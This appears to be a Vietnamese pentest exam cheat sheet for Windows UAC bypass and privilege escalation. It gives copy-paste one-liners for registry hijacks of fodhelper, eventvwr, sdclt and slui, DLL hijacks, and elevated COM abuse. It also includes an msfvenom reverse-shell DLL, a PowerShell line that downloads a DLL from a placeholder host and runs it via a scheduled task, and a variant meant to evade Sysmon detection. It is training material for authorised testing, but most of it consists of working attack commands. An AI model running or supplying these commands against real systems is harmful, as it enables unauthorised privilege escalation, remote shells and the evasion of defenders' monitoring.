---
title: "Field Manual"
tags: [pentest, field-manual, windows, uac-bypass, reference]
created: 2026-04-02
---

> **Mục đích**: Tài liệu tra cứu nhanh trong thi — mỗi lesson thêm một entry.
> **Cách dùng**: Ctrl+F technique name → xem lệnh nhanh, điều kiện, và link về lesson đầy đủ.

---

## Recon & Enumeration

*[Tích lũy từ lessons thuộc Phase Recon]*

---

## Web Attacks

*[Tích lũy từ lessons thuộc Phase Web Attacks]*

---

## Password & Hash Attacks

*[Tích lũy từ lessons thuộc Phase Password/Hash]*

---

## Linux Privilege Escalation

*[Tích lũy từ lessons thuộc Phase Linux PrivEsc]*

---

## Windows Privilege Escalation

#### fodhelper / computerdefaults UAC Bypass
- **Condition**: User trong Admins group, UAC ≠ Always Notify, Windows 10/11
- **Quick command**: `reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f && reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f && start fodhelper.exe`
- **Full flow**: Plant ms-settings registry key → set DelegateExecute="" → trigger fodhelper → verify High Integrity → cleanup
- **Look for**: `whoami /groups | findstr "High Mandatory"` — SeDebugPrivilege enabled
- **Swap**: Replace `fodhelper.exe` với `computerdefaults.exe` — cùng registry key
- **Ref**: [[03-registry-hijack-fodhelper|03. Registry Hijack — fodhelper]]

#### eventvwr.exe Fileless UAC Bypass
- **Condition**: User trong Admins, UAC ≠ Always Notify, Windows 7–11, không cần drop file
- **Quick command**: `reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f && start eventvwr.exe && reg delete "HKCU\Software\Classes\mscfile" /f`
- **Full flow**: Plant mscfile handler → trigger eventvwr → cleanup
- **Look for**: cmd.exe mới ở High Integrity, không có UAC prompt
- **Fallback**: `start perfmon.exe` — cùng registry key `mscfile`
- **Ref**: [[04-registry-hijack-eventvwr|04. Registry Hijack — eventvwr (Fileless)]]

#### sdclt.exe UAC Bypass (IsolatedCommand)
- **Condition**: User trong Admins, UAC ≠ Always Notify, Windows 10
- **Quick command**: `reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "IsolatedCommand" /t REG_SZ /d "cmd.exe" /f && sdclt.exe /KnownFolder:{3EB685DB-65F9-4CF6-A03A-E3EF65729F3D}`
- **Full flow**: Plant Folder class IsolatedCommand → trigger sdclt + GUID → cleanup
- **Variant 2**: App Paths — `reg add "HKCU\...\App Paths\control.exe" /d "cmd.exe" /f && start sdclt.exe`
- **Ref**: [[05-registry-hijack-sdclt-perfmon|05. Registry Hijack — sdclt & perfmon]]

#### slui.exe / changepk.exe UAC Bypass
- **Condition**: User trong Admins, UAC ≠ Always Notify, Windows 10
- **Quick command**: `reg add "HKCU\Software\Classes\exefile\shell\open\command" /d "cmd.exe" /f && reg add "HKCU\Software\Classes\exefile\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f && start slui.exe`
- **Full flow**: Plant exefile handler + DelegateExecute → trigger slui → cleanup
- **Fallback**: `start changepk.exe` thay slui — cùng registry key
- **Ref**: [[06-registry-hijack-slui-changepk|06. Registry Hijack — slui & changepk]]

#### SystemPropertiesAdvanced.exe DLL Hijack
- **Condition**: User trong Admins, WindowsApps trong %PATH%, Windows 10/11 64-bit
- **Quick command**: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o srrstr.dll` → upload → `Copy-Item .\srrstr.dll $env:LOCALAPPDATA\Microsoft\WindowsApps\srrstr.dll` → `start SystemPropertiesAdvanced.exe`
- **Full flow**: Compile DLL → upload → place in WindowsApps → trigger → cleanup
- **Fallback**: Thay bằng `SystemPropertiesProtection.exe`, `SystemPropertiesRemote.exe`
- **Ref**: [[07-dll-hijack-systemproperties|07. DLL Hijack — SystemPropertiesAdvanced]]

#### IFileOperation Privileged DLL Copy
- **Condition**: User trong Admins, UAC ≠ Always Notify, PowerShell available
- **Quick command**: `$s=New-Object -ComObject Shell.Application; $s.Namespace("C:\Windows\System32").CopyHere($s.Namespace($srcDir).ParseName($dll), 0x10); Start-Sleep 3`
- **Full flow**: Create DLL → IFileOperation copy to System32 via dllhost.exe → trigger elevated binary → cleanup
- **Detection IOC**: `dllhost.exe /Processid:{3AD05575-8857-4850-9277-11B85BDB8E09}`
- **Ref**: [[08-ifileoperation-dll-hijack|08. IFileOperation Privileged File Copy]]

#### Mock Trusted Directory (Trailing Space)
- **Condition**: User trong Admins, Windows 10 unpatched older builds
- **Quick test**: `mkdir "\\?\C:\Windows \" && echo VULNERABLE && rd "\\?\C:\Windows \" /S /Q`
- **Full flow**: `mkdir "\\?\C:\Windows \System32"` → copy signed binary → `mklink` → trigger → cleanup
- **Note**: Partially patched — verify compatibility trước
- **Ref**: [[09-mock-trusted-directories|09. Mock Trusted Directories]]

#### Elevated COM — ICMLuaUtil & CMSTP
- **Condition**: User trong Admins, UAC ≠ Always Notify, PowerShell available
- **Quick command**: `$t=[Type]::GetTypeFromCLSID([Guid]"3E5FC7F9-9A51-4367-9063-A120244FBEC7"); $o=[Activator]::CreateInstance($t); $o.ShellExec("cmd.exe","","C:\Windows\System32",0,1)`
- **CMSTP variant**: Tạo INF với `[Run]` section → `cmstp.exe /au bypass.inf`
- **MSF**: `use exploit/windows/local/bypassuac_comhijack`
- **Used by**: LockBit, DarkSide ransomware
- **Ref**: [[10-elevated-com-icmluautil-cmstp|10. Elevated COM — ICMLuaUtil & CMSTP]]

#### CurVer Registry Redirect — fodhelper Evasion
- **Condition**: Sysmon rule monitor ms-settings\Shell\Open\command → cần evasion
- **Quick command**: `$cv="ms-settings.e"; New-ItemProperty -Force "HKCU:\Software\Classes\ms-settings" -Name CurVer -Value $cv; New-Item -Force "HKCU:\Software\Classes\$cv\Shell\Open\command" -Value "cmd.exe"; Start-Process fodhelper.exe; Start-Sleep 3; Remove-Item -Recurse "HKCU:\Software\Classes\ms-settings","HKCU:\Software\Classes\$cv"`
- **Full flow**: Set CurVer redirect → plant payload ở ms-settings.e → trigger → cleanup cả hai keys
- **Look for**: Sysmon Event 13 shows ms-settings.e — không match standard rule
- **Ref**: [[11-com-token-security-evasion|11. COM Token Security Attributes & Detection Evasion]]

#### SilentCleanup Scheduled Task DLL Hijack
- **Condition**: User trong Admins — **works with UAC Always Notify**
- **Quick command**: Setup WMI monitor DismHost → `Start-ScheduledTask SilentCleanup` → plant `api-ms-win-core-kernel32-legacy-l1.dll` vào `%TEMP%\{GUID}\`
- **Full flow**: Prep DLL → WMI monitor → trigger task → plant DLL khi DismHost spawn → callback
- **Target DLL**: `api-ms-win-core-kernel32-legacy-l1.dll`
- **Ref**: [[12-silentcleanup-task-hijack|12. SilentCleanup Scheduled Task Hijack]]

#### %windir% Environment Variable Hijack
- **Condition**: User trong Admins — **works with UAC Always Notify, no race condition**
- **Quick command**: `$f="$env:TEMP\w$(Get-Random)"; md "$f\System32"|Out-Null; IWR http://IP/npmproxy.dll -OutFile "$f\System32\npmproxy.dll"; [System.Environment]::SetEnvironmentVariable("windir",$f,"User"); Start-ScheduledTask -TaskPath "\Microsoft\Windows\Maintenance\" -TaskName "WinSAT"; Start-Sleep 5; [System.Environment]::SetEnvironmentVariable("windir",$null,"User"); Remove-Item -Recurse -Force $f`
- **Full flow**: Fake windir\System32 → plant npmproxy.dll → override HKCU\Environment\windir → trigger WinSAT → cleanup ngay
- **Target DLL**: `npmproxy.dll`
- **WARN**: Cleanup `windir` ngay lập tức sau callback
- **Ref**: [[13-env-var-hijack-windir|13. Environment Variable Hijack — %windir%]]

---

## Active Directory

*[Tích lũy từ lessons thuộc Phase AD Attacks]*

---

## Pivoting & Tunneling

*[Tích lũy từ lessons thuộc Phase Pivoting]*

---

## Evasion

*[Tích lũy từ lessons thuộc Phase Evasion]*

---

## Tools Reference

#### UACME (akagi64.exe)
- **Condition**: Lab / authorized testing — AV sẽ flag là HackTool
- **Quick command**: `akagi64.exe <MethodID> [payload.exe]`
- **Full flow**: `git clone https://github.com/hfiref0x/UACME` → build với VS2019+ → `akagi64.exe 23` (fodhelper) hoặc method khác
- **Key methods**: 23=fodhelper, 61=eventvwr, 43=ICMLuaUtil, 53=sdclt, 33=SilentCleanup+env
- **Look for**: High Integrity cmd.exe spawn, no UAC prompt
- **Defender detect**: Methods 33, 34, 56, 59, 62, 67 (alerted); 41, 43, 65 (no default detect)
- **Ref**: [[14-uacme-framework|14. UACME — UAC Bypass Framework]]

---

*Field Manual được cập nhật tự động sau mỗi lesson. KHÔNG edit thủ công phần trên — chỉ thêm entries vào các sections.*
